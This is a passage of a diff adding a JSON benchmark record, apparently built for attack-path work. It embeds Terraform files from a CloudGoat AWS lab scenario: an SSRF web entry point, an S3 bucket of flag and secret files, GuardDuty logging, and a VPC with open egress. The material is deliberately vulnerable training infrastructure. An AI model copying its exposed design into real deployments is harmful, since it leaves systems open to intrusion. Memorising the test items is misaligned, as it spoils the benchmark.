+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/outputs.tf",
+      "member_sha256": "428a3477b1dc79954a9b7b584ac43f20012c1f3c1374b25ace27183be2ab2487",
+      "bytes": 489,
+      "content_kind": "tf",
+      "text": "#Required: Always output the AWS Account ID\noutput \"cloudgoat_output_aws_account_id\" {\n  value = data.aws_caller_identity.current.account_id\n}\n\n# Scenario starts at ssrf web url.\noutput \"ssrf_web_url\" {\n  # During scenario destroy, there is no string left in the list, resulting in an error.\n  # So make value = \"\", when list's length 0.\n  value = length(data.aws_instances.asg_instance.public_ips) > 0 ? \"Scenario start at : http://${data.aws_instances.asg_instance.public_ips[0]}\" : \"\"\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/provider.tf",
+      "member_sha256": "47015b680770fe96e618bd1f19abf6c5ecea301be40f888e1ff47a9a17ea221f",
+      "bytes": 375,
+      "content_kind": "tf",
+      "text": "terraform {\n  required_version = \">= 1.6\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n    archive = {\n      source  = \"hashicorp/archive\"\n      version = \">= 2.4\"\n    }\n    time = {\n      source  = \"hashicorp/time\"\n      version = \">= 0.9\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/s3.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/s3.tf",
+      "member_sha256": "185665b761b6265952308be718630351b7fb21d1e612eb73681e55cd8db036cd",
+      "bytes": 2309,
+      "content_kind": "tf",
+      "text": "#Secret S3 Bucket\nlocals {\n  # Ensure the bucket suffix doesn't contain invalid characters\n  # \"Bucket names can consist only of lowercase letters, numbers, dots (.), and hyphens (-).\"\n  # (per https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucketnamingrules.html)\n  bucket_suffix = replace(var.cgid, \"/[^a-z0-9-.]/\", \"-\")\n}\n\n# Create Secret Bucket\nresource \"aws_s3_bucket\" \"secret-s3-bucket\" {\n  bucket        = \"cg-s3-${local.bucket_suffix}\"\n  force_destroy = true\n}\n\n# Store secret string for easy path in flag.txt\nresource \"aws_s3_object\" \"credentials_easy_path\" {\n  bucket = aws_s3_bucket.secret-s3-bucket.id\n  key    = \"flag.txt\"\n  source = \"./flag.txt\"\n}\n\n# Store secret string for hard path in critical.txt\nresource \"aws_s3_object\" \"credentials_hard_path\" {\n  bucket = aws_s3_bucket.secret-s3-bucket.id\n  key    = \"secret-string.txt\"\n  source = \"./secret-string.txt\"\n}\n\n# AWS CLI logs for GuardDuty analysis\nresource \"aws_s3_bucket\" \"cloudtrail_bucket\" {\n  bucket        = \"cg-cloudtrail-s3-${local.bucket_suffix}\"\n  force_destroy = true\n}\n\n# Block public access for Cloudtrail Logs Bucket\nresource \"aws_s3_bucket_public_access_block\" \"trail_bucket_block_public\" {\n  bucket = aws_s3_bucket.cloudtrail_bucket.id\n\n  block_public_acls       = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n  ignore_public_acls      = true\n}\n\nresource \"aws_s3_bucket_policy\" \"trail_bucket_policy\" {\n  bucket = aws_s3_bucket.cloudtrail_bucket.id\n  policy = jsonencode({\n    Version = \"2012-10-17\",\n    Statement = [\n      {\n        Effect = \"Allow\",\n        Action = \"s3:GetObject\",\n        Resource = \"${aws_s3_bucket.cloudtrail_bucket.arn}/*\",\n        Principal = {\n          Service = \"guardduty.amazonaws.com\"\n        }\n      },{\n        Effect = \"Allow\",\n        Action = \"s3:PutObject\",\n        Resource = \"${aws_s3_bucket.cloudtrail_bucket.arn}/*\",\n        Principal = {\n          Service = \"cloudtrail.amazonaws.com\"\n        },\n        Condition = {\n          StringEquals = {\n            \"s3:x-amz-acl\" = \"bucket-owner-full-control\"\n          }\n        }\n      },{\n        Effect = \"Allow\",\n        Action = \"s3:GetBucketAcl\",\n        Resource = aws_s3_bucket.cloudtrail_bucket.arn,\n        Principal = {\n          Service = \"cloudtrail.amazonaws.com\"\n        }\n      }\n    ]\n  })\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/ses.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/ses.tf",
+      "member_sha256": "d6ea3fa9baad76957b2c12419cedb6a87143fbe0819547e363abd4ecfe6acf76",
+      "bytes": 103,
+      "content_kind": "tf",
+      "text": "# Create SES for sending emails.\nresource \"aws_ses_email_identity\" \"email\" {\n  email = var.user_email\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/variables.tf",
+      "member_sha256": "057e212ecb7ce23950c6b7e4c459c32619954ff0c472c27eefe7af792dde5c17",
+      "bytes": 835,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use.\"\n  type        = string\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy resources to.\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming.\"\n  type        = string\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es).\"\n  type        = list(string)\n  default     = [\"127.0.0.1/24\"]\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the stack.\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario.\"\n  default     = \"ecs_privesc_evade_protection\"\n  type        = string\n}\n\nvariable \"user_email\" {\n  description = \"Once guardduty detects attack, a mail will be sent to you\"\n  type        = string\n}\n\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/vpc.tf",
+      "member_sha256": "74e485b6920a64fd075afc9095c6d94a23361e833bee43b4a53fba75fdef293e",
+      "bytes": 1485,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"vpc\" {\n  cidr_block           = \"192.168.150.0/24\"\n  enable_dns_support   = true\n  enable_dns_hostnames = true\n\n  tags = {\n    \"Name\" = \"cg-${var.cgid}-main\"\n  }\n}\n\nresource \"aws_internet_gateway\" \"internet_gateway\" {\n  vpc_id = aws_vpc.vpc.id\n\n  tags = {\n    \"Name\" = \"cg-${var.cgid}-main\"\n  }\n}\n\nresource \"aws_subnet\" \"public\" {\n  vpc_id            = aws_vpc.vpc.id\n  availability_zone = data.aws_availability_zones.current_az.names[0]\n  cidr_block        = \"192.168.150.0/26\"\n\n  tags = {\n    \"Name\" = \"cg-${var.cgid}-public\"\n  }\n}\n\nresource \"aws_route_table\" \"public\" {\n  vpc_id = aws_vpc.vpc.id\n\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.internet_gateway.id\n  }\n\n  tags = {\n    \"Name\" = \"cg-${var.cgid}-public\"\n  }\n}\n\nresource \"aws_route_table_association\" \"route_table_association\" {\n  subnet_id      = aws_subnet.public.id\n  route_table_id = aws_route_table.public.id\n}\n\n# Security Group for EC2\n# Allow http from whitelist IP.\n# Allow All outbound.\nresource \"aws_security_group\" \"allow_http\" {\n  name        = \"cg-${var.cgid}-allow-http\"\n  description = \"Allow inbound traffic on port 80 from whitelist IP\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"cg-allow-http-${var.cgid}\"\n  }\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "4302b4336a672d014875d0c476add5aab8f92366f24b4dbfcb2ad9820c38d47e",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
